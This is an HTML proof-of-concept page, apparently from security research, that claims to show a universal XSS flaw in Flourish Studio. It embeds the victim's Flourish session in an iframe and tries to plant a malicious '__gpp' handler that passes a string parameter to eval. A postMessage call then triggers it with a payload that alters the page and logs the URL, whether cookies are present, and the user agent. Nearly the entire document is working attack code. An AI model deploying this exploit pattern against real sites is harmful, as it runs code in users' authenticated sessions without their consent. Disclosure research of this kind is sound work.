<!DOCTYPE html>
<html>
<head>
    <title>Security Research Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .info { background: #f0f8ff; padding: 15px; border-radius: 5px; margin: 20px 0; }
        iframe { border: 2px solid #3366ff; }
    </style>
</head>
<body>
    <h1>Security Research Demonstration</h1>
    
    <div class="info">
        <strong>This page demonstrates the Universal XSS vulnerability in Flourish Studio</strong>
        <p>When loaded, it will automatically exploit the vulnerable GPP handler in the embedded Flourish dashboard.</p>
    </div>

    <!-- Victim's Flourish session loads here -->
    <iframe id="flourishFrame" src="https://app.flourish.studio/projects" 
            style="width:100%; height:700px; border: 2px solid blue;"></iframe>

    <script>
        // Wait for page to fully load
        window.addEventListener("load", function() {
            const frame = document.getElementById("flourishFrame");
            console.log("ðŸš€ Attacker page loaded, waiting for Flourish iframe...");

            frame.onload = function() {
                console.log("âœ… Flourish iframe loaded, injecting exploit...");
                
                // 1. Define the malicious GPP handler in victim's context
                try {
                    frame.contentWindow.__gpp = function(command, callback, parameter) {
                        console.log("ðŸŽ¯ GPP Command intercepted in victim session:", command);
                        
                        // Execute attacker code in victim's authenticated session
                        if (typeof parameter === 'string' && parameter.trim()) {
                            try {
                                (0, eval)(parameter); // CODE EXECUTION
                                console.log("âœ… Remote code executed in victim session");
                            } catch(e) {
                                console.error("âŒ Execution failed:", e);
                            }
                        }
                        
                        // Return legitimate response
                        if (typeof callback === 'function') {
                            callback("success", true);
                        }
                        return "exploited";
                    };
                    console.log("âœ… Malicious GPP handler installed in victim session");
                } catch(e) {
                    console.error("âŒ Failed to inject GPP handler:", e);
                    return;
                }

                // 2. Trigger the exploit after short delay
                setTimeout(() => {
                    console.log("ðŸ“¤ Sending exploit trigger to victim session...");
                    
                    frame.contentWindow.postMessage({
                        __gppCall: {
                            command: "execute",
                            parameter: `
                                // This code runs in the VICTIM'S authenticated session
                                
                                // Visual proof: Modify the UI
                                document.body.style.border = '10px solid red';
                                document.title = 'ðŸš¨ VICTIM ACCOUNT - Universal XSS Active';
                                
                                // Create visible warning banner
                                const banner = document.createElement('div');
                                banner.innerHTML = 'ðŸ”´ SECURITY ALERT: Universal XSS Exploit Active - Your Session is Compromised';
                                banner.style.cssText = 
                                    'position: fixed; top: 0; left: 0; width: 100%; ' +
                                    'background: linear-gradient(90deg, #ff0000, #ff6666); ' +
                                    'color: white; padding: 15px; text-align: center; ' +
                                    'font-weight: bold; font-size: 18px; z-index: 99999; ' +
                                    'border-bottom: 3px solid darkred; font-family: Arial, sans-serif;';
                                document.body.appendChild(banner);
                                
                                // Log evidence to console
                                console.log('ðŸŽ¯ UNIVERSAL XSS SUCCESSFUL - Remote code execution achieved');
                                console.log('ðŸ“¦ Victim session info:', {
                                    url: window.location.href,
                                    cookies: document.cookie ? 'Session cookies present' : 'No cookies',
                                    userAgent: navigator.userAgent
                                });
                            `,
                            callId: "universal-xss-poc"
                        }
                    }, "*");
                    
                    console.log("âœ… Exploit trigger sent to victim session");
                }, 2000);
            };
        });
    </script>
</body>
</html>
